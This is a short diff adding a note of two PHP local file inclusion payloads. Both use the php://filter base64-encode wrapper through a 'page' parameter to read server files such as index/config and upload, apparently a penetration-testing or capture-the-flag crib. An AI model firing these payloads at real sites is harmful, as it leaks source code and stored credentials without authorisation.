@@ -1,0 +1,4 @@
+http://xxxx/?page=php://filter/read=convert.base64-encode/resource=index/config/....
+
+php://filter/convert.base64-encode/resource=upload
+
